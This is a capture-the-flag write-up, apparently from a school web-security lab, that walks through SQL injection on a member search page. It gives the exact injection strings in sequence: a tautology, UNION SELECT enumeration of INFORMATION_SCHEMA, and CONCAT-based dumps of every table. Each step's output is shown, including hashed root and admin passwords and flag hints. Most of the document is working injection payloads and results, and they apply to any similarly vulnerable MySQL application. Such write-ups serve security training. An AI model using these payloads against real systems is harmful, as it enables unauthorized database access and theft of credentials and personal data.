Page member:
sql injection:
list all the datas from table and column selected:

```
42 OR 1

First name: one
Surname : me

First name: two
Surname : me

First name: three
Surname : me

First name: Flag
Surname : GetThe
```

get informations about tables:

```
42 UNION ALL SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES

Database: Member_Brute_Force
Table: db_default

Database: Member_Sql_Injection
Table: users

Database: Member_guestbook
Table: guestbook

Database: Member_images
Table: list_images

Database: Member_survey
Table: vote_dbs
```

Get informations about column name:

```
42 UNION ALL SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS

First name: db_default
Surname : id

First name: db_default
Surname : username

First name: db_default
Surname : password

First name: users
Surname : user_id

First name: users
Surname : first_name

First name: users
Surname : last_name

First name: users
Surname : town

First name: users
Surname : country

First name: users
Surname : planet

First name: users
Surname : Commentaire

First name: users
Surname : countersign

First name: guestbook
Surname : id_comment

First name: guestbook
Surname : comment

First name: guestbook
Surname : name

First name: list_images
Surname : id

First name: list_images
Surname : url

First name: list_images
Surname : title

First name: list_images
Surname : comment

First name: vote_dbs
Surname : id_vote

First name: vote_dbs
Surname : vote

First name: vote_dbs
Surname : nb_vote

First name: vote_dbs
Surname : subject
```

Dump the db_default table:

```
42 UNION ALL SELECT CONCAT(ID, 0x0A, USERNAME, 0x0A, PASSWORD), 42 FROM Member_Brute_Force.db_default 

First name: 1
root
3bf1114a986ba87ed28fc1b5884fc2f8

First name: 2
admin
3bf1114a986ba87ed28fc1b5884fc2f8
```

Dump the users table:

```
42 UNION ALL SELECT CONCAT(USER_ID, 0x0A, FIRST_NAME, 0x0A, FIRST_NAME, 0x0A, LAST_NAME, 0x0A, TOWN, 0x0A, COUNTRY, 0x0A, PLANET, 0x0A, COMMENTAIRE, 0x0A, COUNTERSIGN), 42 FROM users 

First name: 5
Flag
Flag
GetThe
42
42
42
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28
```

Dump the guestbook table;

```
42 UNION ALL SELECT CONCAT(ID_COMMENT, 0x0A, NAME, 0x0A, COMMENT), 42 FROM Member_guestbook.guestbook

First name: 1
wil
This is the best site EVER
```

Dump the list_images table;

```
42 UNION ALL SELECT CONCAT(ID, 0x0A, URL, 0x0A, TITLE, 0x0A, COMMENT), 42 FROM Member_images.list_images

First name: 1
https://fr.wikipedia.org/wiki/Programme_
Nsa
An image about the NSA !

First name: 2
https://fr.wikipedia.org/wiki/Fichier:42
42 !
There is a number..

First name: 3
https://fr.wikipedia.org/wiki/Logo_de_Go
Google
Google it !

First name: 4
https://en.wikipedia.org/wiki/Earth#/med
Earth
Earth!

First name: 5
borntosec.ddns.net/images.png
Hack me ?
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Dump the vote_dbs table (result are the same as /?page=survey;

```
42 UNION ALL SELECT CONCAT(id_vote, 0x0A, vote, 0x0A, nb_vote, 0x0A, subject), 42 FROM Member_survey.vote_dbs
```
